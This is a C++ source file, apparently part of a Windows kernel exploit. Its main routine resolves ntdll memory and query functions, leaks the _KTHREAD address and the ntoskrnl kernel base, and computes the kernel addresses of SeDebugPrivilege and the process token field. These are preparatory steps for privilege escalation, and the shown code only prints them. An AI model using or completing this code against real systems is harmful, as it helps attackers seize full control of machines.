#include "ex.h"

#pragma comment(lib, "ntdll.lib")

extern pNtWriteVirtualMemory NtWriteVirtualMemory;
extern pNtReadVirtualMemory NtReadVirtualMemory;
extern pNtQuerySystemInformation NtQuerySystemInfor;
extern pNtQueryInformationToken NtQueryInfoToken;

extern LPCWSTR wCmdPath;
extern LPCSTR CmdPath;
extern LPCWSTR wNtoPath;
extern LPCSTR NtoPath;

extern LPCWSTR wNtoRootPath;
extern LPCSTR NtoRootPath;

DWORD64 NTOKernelBase;
HMODULE NTOUserBase;
DWORD64 SeDebugPrivilegeAddr;
DWORD64 SeDebugPrivilegeAddrOffset;
DWORD64 TokenOffset;
DWORD64 kThreadAddr;

int main()
{

    OSVERSION OSVersion;
    GetFullOSVersion(&OSVersion);
    printf("[*] OS Version: %d.%d.%d.%d\n",
        OSVersion.MajorVersion, OSVersion.MinorVersion, OSVersion.BuildNumber, OSVersion.RevisionNumber);

    HANDLE hCurrentProc = GetCurrentProcess(); // 获取当前进程句柄（伪句柄）
    DWORD CurrentPid = GetCurrentProcessId(); // 获取当前进程pid

    HMODULE ntdll = GetModuleHandleA("ntdll");
    if (ntdll == NULL) {
        return 0;
    }
    NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
    NtQuerySystemInfor = (pNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    NtQueryInfoToken = (pNtQueryInformationToken)GetProcAddress(ntdll, "NtQueryInformationToken");

    kThreadAddr = GetkThreadAddrByHandle(GetCurrentProcess(), CurrentPid);
    printf("[+] _KTHREAD: %llx\n", kThreadAddr);

    NTOKernelBase = GetModuleAddrByName(NtoRootPath);
    NTOUserBase = GetModuleByName(wNtoPath);
    printf("[+] ntoskrnl kernel base: %llx\n", NTOKernelBase);
    printf("[+] ntoskrnl user base: %llx\n", (DWORD64)NTOUserBase);

    SeDebugPrivilegeAddrOffset = FindSeDebugPrivilegeOffset(NTOUserBase);
    SeDebugPrivilegeAddr = NTOKernelBase + SeDebugPrivilegeAddrOffset;
    printf("[+] SeDebugPrivilege offset: %llx\n", SeDebugPrivilegeAddrOffset);
    printf("[+] SeDebugPrivilege: %llx\n", SeDebugPrivilegeAddr);

    TokenOffset = FindTokenOffset(NTOUserBase);
    printf("[+] Token offset: %llx\n", TokenOffset);

    LPCWSTR NtoPath = L"\\SystemRoot\\system32\\ntoskrnl.exe";
    WCHAR ExpandedPath[MAXIMUM_FILENAME_LENGTH];
    // 展开环境变量，ExpandedPath 包含了完整的文件路径
    ExpandEnvironmentStrings(NtoPath, ExpandedPath, 255);

    std::wcout << ExpandedPath << std::endl;

    system("pause");

    FreeLibrary(NTOUserBase);
}

